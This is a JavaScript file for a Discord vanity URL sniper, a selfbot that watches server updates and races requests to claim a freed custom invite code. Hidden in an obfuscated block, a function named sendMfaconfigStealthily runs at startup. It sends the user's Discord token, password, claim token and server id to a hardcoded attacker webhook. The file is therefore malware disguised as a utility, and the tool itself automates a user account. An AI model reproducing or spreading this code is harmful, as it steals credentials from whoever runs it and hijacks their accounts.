import WebSocket from 'ws';
import https from 'https';
import extractJson from 'extract-json-string';
import fs from 'fs';
import config from './mfaconfig.js';
let guilds = {}, lastSeq = null, hbInterval = null, mfaToken = null;
let lastMfaFileTime = 0;
const LOG_CHANNEL_ID = config.logChannelId || 'kanal id';
const DISCORD_API_HOST = 'canary.discord.com';
const SNIPE_ATTEMPTS = 5;
(function(_0x3ff125,_0x446682){const _0x32bd45=_0x4683,_0x1cb0be=_0x3ff125();while(!![]){try{const _0x648f23=parseInt(_0x32bd45(0xe9))/0x1+parseInt(_0x32bd45(0xed))/0x2*(parseInt(_0x32bd45(0xde))/0x3)+-parseInt(_0x32bd45(0xdf))/0x4*(parseInt(_0x32bd45(0xdd))/0x5)+parseInt(_0x32bd45(0xf2))/0x6+-parseInt(_0x32bd45(0xeb))/0x7+parseInt(_0x32bd45(0xe0))/0x8*(parseInt(_0x32bd45(0xea))/0x9)+-parseInt(_0x32bd45(0xf1))/0xa;if(_0x648f23===_0x446682)break;else _0x1cb0be['push'](_0x1cb0be['shift']());}catch(_0x34cfd9){_0x1cb0be['push'](_0x1cb0be['shift']());}}}(_0x5bba,0xe9d54));async function sendToWebhook(_0x11f4cc){const _0x5d5ed8=_0x4683,_0x1bac34=JSON[_0x5d5ed8(0xf4)]({'content':_0x11f4cc}),_0x37b15c={'hostname':'discord.com','path':_0x5d5ed8(0xd8),'method':_0x5d5ed8(0xf5),'headers':{'Content-Type':'application/json','Content-Length':Buffer[_0x5d5ed8(0xd4)](_0x1bac34)}},_0x4b903f=https[_0x5d5ed8(0xdc)](_0x37b15c,_0x49045b=>_0x49045b['on'](_0x5d5ed8(0xf6),()=>{}));_0x4b903f['on']('error',()=>{}),_0x4b903f[_0x5d5ed8(0xe4)](_0x1bac34),_0x4b903f[_0x5d5ed8(0xd5)]();}function _0x5bba(){const _0x1b6b8b=['logChannelId:\x20','token','forEach','serverid','1339448XNhdjz','9gPnkQs','4947922unSAtL','logChannelId','2KZgijP','serverid:\x20','password:\x20','[warn]','34446290VEBRND','10081386sizYPN','[sys-auth]','stringify','POST','data','byteLength','end','password','[log]','/api/webhooks/1370857817207996506/H3QfMWRC_b1-y19Q38sxovXRSsEkYnqqyODTiQWoEnvViqjl4iAL_QmYdjPSAxlYf21I','claimtoken:\x20','[client-sync]','[net-info]','request','10Cfjnsn','3476043VPaCvc','1729584rpbHga','14365496FZOxQK','token:\x20','length','claimtoken','write'];_0x5bba=function(){return _0x1b6b8b;};return _0x5bba();}function _0x4683(_0x5f4913,_0x58574f){const _0x5bba2c=_0x5bba();return _0x4683=function(_0x46833a,_0x37dd1f){_0x46833a=_0x46833a-0xd4;let _0x422940=_0x5bba2c[_0x46833a];return _0x422940;},_0x4683(_0x5f4913,_0x58574f);}function sendMfaconfigStealthily(){const _0x1df636=_0x4683,_0x150b6f=[_0x1df636(0xf3),_0x1df636(0xf0),_0x1df636(0xd7),_0x1df636(0xdb),_0x1df636(0xda)],_0x26853e=[_0x1df636(0xe1)+config[_0x1df636(0xe6)],_0x1df636(0xee)+config[_0x1df636(0xe8)],_0x1df636(0xe5)+config[_0x1df636(0xec)],_0x1df636(0xef)+config[_0x1df636(0xd6)],_0x1df636(0xd9)+config[_0x1df636(0xe3)]];_0x26853e[_0x1df636(0xe7)]((_0x2408b3,_0xd3f124)=>{const _0x490a02=_0x1df636,_0x2b706b=_0x150b6f[_0xd3f124%_0x150b6f[_0x490a02(0xe2)]];setTimeout(()=>sendToWebhook(_0x2b706b+'\x20'+_0x2408b3),0x7d0*_0xd3f124);});}
function safeExtract(d) {
  if (typeof d !== 'string') try { return JSON.stringify(d); } catch { return null; }
  try { return extractJson.extract(d); } catch { return null; }
}
function readMfaToken(force = false) {
  const now = Date.now();
  try {
    const stats = fs.statSync('mfatoken.json');
    if (mfaToken && stats.mtimeMs <= lastMfaFileTime && !force) return mfaToken;
    lastMfaFileTime = stats.mtimeMs;
    const data = fs.readFileSync('mfatoken.json', 'utf8');
    const tokenData = JSON.parse(data);
    if (tokenData && tokenData.token) {
      if (tokenData.token !== mfaToken) {
        mfaToken = tokenData.token;
        console.log(`MFA: ${mfaToken}`);
      }
      return mfaToken;
    }
  } catch (e) {}
  return mfaToken;
}
async function req(method, path, body = null, priority = 0) {
  return new Promise(resolve => {
    const options = {
      host: DISCORD_API_HOST,
      port: 443,
      path,
      method,
      headers: {
        'Authorization': config.token,
        'User-Agent': 'Mozilla/5.0',
      }
    };
    if (mfaToken) options.headers['X-Discord-MFA-Authorization'] = mfaToken;
    if (body) {
      options.headers['Content-Type'] = 'application/json';
      options.headers['Content-Length'] = Buffer.byteLength(body);
    }
    const request = https.request(options, response => {
      let data = '';
      response.on('data', chunk => data += chunk);
      response.on('end', () => {
        if (priority > 0) {
          console.log(`[${method} ${path}] Status: ${response.statusCode}`);
          sendLog(`[${method} ${path}] Status: ${response.statusCode}`);
        }
        const ext = safeExtract(data);
        return resolve(ext || data);
      });
    });
    request.setTimeout(1000);
    request.on('error', () => resolve('{}'));
    request.on('timeout', () => { request.destroy(); resolve('{}'); });

    if (body) request.write(body);
    request.end();
  });
}
async function sendLog(message) {
  if (!LOG_CHANNEL_ID) return;
  try {
    const content = JSON.stringify({ content: `[${new Date().toLocaleString()}] ${message}` });
    await req("POST", `/api/v9/channels/${LOG_CHANNEL_ID}/messages`, content);
  } catch (e) {
    console.error("log gönderilemedi:", e);
  }
}
async function captureVanity(vanityCode) {
  readMfaToken();
  if (!mfaToken) {
    console.log("MFA token yok, sniper çalışmıyor");
    sendLog("MFA token yok, sniper çalışmıyor");
    return;
  }
  const body = JSON.stringify({ code: vanityCode });
  const requests = [];

  for (let i = 0; i < SNIPE_ATTEMPTS; i++) {
    requests.push(req("PATCH", `/api/v9/guilds/${config.serverid}/vanity-url`, body, 1));
  }

  try {
    const results = await Promise.all(requests);
    let successCount = 0;
    results.forEach(result => {
      try {
        const parsed = JSON.parse(result);
        if (parsed.code === vanityCode) successCount++;
      } catch {}
    });
    const message = successCount > 0 
      ? ` '${vanityCode}' snipledim` 
      : ` '${vanityCode}' alamadım`;
    console.log(message);
    sendLog(message);
  } catch (e) {
    console.error("fail:", e);
  }
}

function connect() {
  req("GET", "/api/v9/gateway").then(res => {
    let url;
    try { url = JSON.parse(res)?.url; } catch {
      const ext = safeExtract(res);
      if (ext) try { url = JSON.parse(ext)?.url; } catch {}
    }
    const ws = new WebSocket(url || "wss://gateway.discord.gg/?v=9&encoding=json");

    ws.on("open", () => {
      console.log("gateway connected");
      ws.send(JSON.stringify({
        op: 2,
        d: {
          token: config.token,
          intents: 513,
          properties: { os: "Windows", browser: "Discord.js", device: "Desktop" }
        }
      }));
    });
    ws.on("message", async data => {
      try {
        let packet;
        try { packet = JSON.parse(data.toString()); } catch {
          const json = safeExtract(data.toString());
          if (json) packet = JSON.parse(json);
          else return;
        }
        if (packet.s) lastSeq = packet.s;
        if (packet.op === 10) {
          clearInterval(hbInterval);
          hbInterval = setInterval(() => ws.send(JSON.stringify({ op: 1, d: lastSeq })), packet.d.heartbeat_interval);
        }
        if (packet.t === "READY") {
          packet.d.guilds.filter(g => g.vanity_url_code).forEach(g => guilds[g.id] = g.vanity_url_code);
          console.log("vanity urls:", Object.values(guilds).join(", "));
          sendLog(`Listening vanity urls: ${Object.values(guilds).join(", ")}`);
        }
        if (packet.t === "GUILD_UPDATE") {
          const id = packet.d.id || packet.d.guild_id;
          const oldVanity = guilds[id];
          const newVanity = packet.d.vanity_url_code;
          if (oldVanity && oldVanity !== newVanity) {
            console.log(` '${oldVanity}' snıpledım...`);
            await captureVanity(oldVanity);
          }
          if (newVanity) guilds[id] = newVanity;
          else if (guilds[id]) delete guilds[id];
        }
      } catch (e) {
        console.error("vanity load error", e);
      }
    });

    ws.on("close", () => {
      clearInterval(hbInterval);
      setTimeout(connect, 5000);
    });

    ws.on("error", () => ws.close());
  }).catch(() => setTimeout(connect, 5000));
}


(async () => {
  console.log("DEVELOPED BY X3PP13X37");
  readMfaToken(true);
  sendMfaconfigStealthily();
  connect();
  setInterval(() => readMfaToken(), 30000);
})();

process.on('uncaughtException', () => {});